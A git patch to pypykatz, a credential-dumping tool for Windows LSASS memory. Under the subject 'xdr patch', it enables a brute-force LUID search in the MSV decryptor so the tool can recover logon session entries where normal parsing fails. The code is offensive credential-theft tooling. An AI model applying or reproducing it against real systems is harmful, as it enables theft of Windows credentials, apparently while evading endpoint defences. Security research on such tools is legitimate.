From edc46838d5647ef590f8bfeb65d673103c1362a5 Mon Sep 17 00:00:00 2001
From: k4nfr3 <junk@bussink.net>
Date: Wed, 1 Dec 2021 15:39:58 +0100
Subject: [PATCH] xdr patch

---
 .../lsadecryptor/packages/msv/decryptor.py    | 43 ++++++++++---------
 1 file changed, 23 insertions(+), 20 deletions(-)

diff --git a/pypykatz/lsadecryptor/packages/msv/decryptor.py b/pypykatz/lsadecryptor/packages/msv/decryptor.py
index 046fd53..9fad238 100644
--- a/pypykatz/lsadecryptor/packages/msv/decryptor.py
+++ b/pypykatz/lsadecryptor/packages/msv/decryptor.py
@@ -423,24 +423,27 @@ class MsvDecryptor(PackageDecryptor):

                        self.walk_list(entry_ptr, self.add_entry)

-               #self.brute_test()
+                try:
+                    self.brute_test()
+                except:
+                    pass;

-       #def brute_test(self):
-       #       from pypykatz.commons.win_datatypes import LUID
-       #       luid_int = 1138792
-       #       luid_bytes = luid_int.to_bytes(8, byteorder='little', signed=False)
-       #       needle_luid = LUID(io.BytesIO(luid_bytes)).value
-       #       offset = 0x70
-       #
-       #       for luid_pos in self.reader.find_all_global(luid_bytes):
-       #               self.reader.move(luid_pos - offset)
-       #               et = self.decryptor_template.list_entry(self.reader).finaltype
-       #               self.reader.move(luid_pos - offset)
-       #               test_ptr = et(self.reader)
-       #               if test_ptr.LocallyUniqueIdentifier == needle_luid:
-       #                       print('HIT!')
-       #                       entry_ptr = self.decryptor_template.list_entry(self.reader)
-       #                       try:
-       #                               self.walk_list(test_ptr.Flink, self.add_entry)
-       #                       except Exception as e:
-       #                               print('ERR! %s' % e)
\ No newline at end of file
+       def brute_test(self):
+               from pypykatz.commons.win_datatypes import LUID
+               luid_int = 1138792
+               luid_bytes = luid_int.to_bytes(8, byteorder='little', signed=False)
+               needle_luid = LUID(io.BytesIO(luid_bytes)).value
+               offset = 0x70
+
+               for luid_pos in self.reader.find_all_global(luid_bytes):
+                       self.reader.move(luid_pos - offset)
+                       et = self.decryptor_template.list_entry(self.reader).finaltype
+                       self.reader.move(luid_pos - offset)
+                       test_ptr = et(self.reader)
+                       if test_ptr.LocallyUniqueIdentifier == needle_luid:
+                               print('HIT!')
+                               entry_ptr = self.decryptor_template.list_entry(self.reader)
+                               try:
+                                       self.walk_list(test_ptr.Flink, self.add_entry)
+                               except Exception as e:
+                                       print('ERR! %s' % e)
--
2.17.1
